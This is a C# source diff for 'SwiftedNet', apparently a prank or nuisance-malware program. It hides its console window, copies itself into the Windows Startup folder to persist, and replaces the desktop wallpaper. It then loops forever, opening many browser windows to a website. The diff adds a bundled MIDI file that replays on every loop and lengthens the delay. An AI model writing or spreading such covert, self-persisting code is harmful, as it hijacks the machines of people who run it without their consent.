@@ -3,6 +3,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Threading;
 
 using Microsoft.Win32;
@@ -14,11 +15,12 @@ namespace SwiftedNet
         private const string url = "https://www.taylorswift.com";
         private const int MIN_BROWSERS = 1;
         private const int MAX_BROWSERS = 20;
-        private const int DELAY_MINUTES = 1;
+        private const int DELAY_MINUTES = 5;
 
         private const string RESOURCE_NAME = "bg.jpg";
-        private const string BG_FILENAME = "bg.jpg";
-        
+
+        private const string MIDI_RESOURCE_NAME = "bg.mid";
+
         [DllImport("kernel32.dll")]
         static extern bool FreeConsole();
 
@@ -28,6 +30,22 @@ namespace SwiftedNet
 
         [DllImport("user32.dll", CharSet = CharSet.Unicode)]
         static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
+
+        [DllImport("winmm.dll", CharSet = CharSet.Unicode)]
+        static extern Int32 mciSendString(String command, StringBuilder buffer, Int32 bufferSize, IntPtr hwndCallback);
+
+        public static void PlayMidi(string fileName)
+        {
+            try
+            {
+                mciSendString("open " + fileName + " type sequencer alias song", new StringBuilder(), 0, new IntPtr());
+                mciSendString("play song", new StringBuilder(), 0, new IntPtr());
+            }
+            catch (Exception)
+            {
+                // Failed to play song
+            }
+        }
 
         private static void OpenBrowser(string url)
         {
@@ -79,18 +97,20 @@ namespace SwiftedNet
             key.SetValue(@"WallpaperStyle", 2.ToString());
             key.SetValue(@"TileWallpaper", 0.ToString());
 
-            ExtractResource(resource, BG_FILENAME);
+            ExtractResource(resource, resource);
             
             SystemParametersInfo(SPI_SETDESKWALLPAPER,
                 0,
-                Path.Combine(AppContext.BaseDirectory, BG_FILENAME),
+                Path.Combine(AppContext.BaseDirectory, resource),
                 SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
         }
 
         static void Main(string[] args)
         {
             FreeConsole();
-            
+
+            ExtractResource(MIDI_RESOURCE_NAME, MIDI_RESOURCE_NAME);
+
             ChangeBackground(RESOURCE_NAME);
 
             CopySelfTo(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
@@ -99,6 +119,8 @@ namespace SwiftedNet
 
             while (true)
             {
+                PlayMidi(MIDI_RESOURCE_NAME);
+
                 var numInstances = rand.Next(MIN_BROWSERS, MAX_BROWSERS);
 
                 for (var x = 0; x < numInstances; x++)
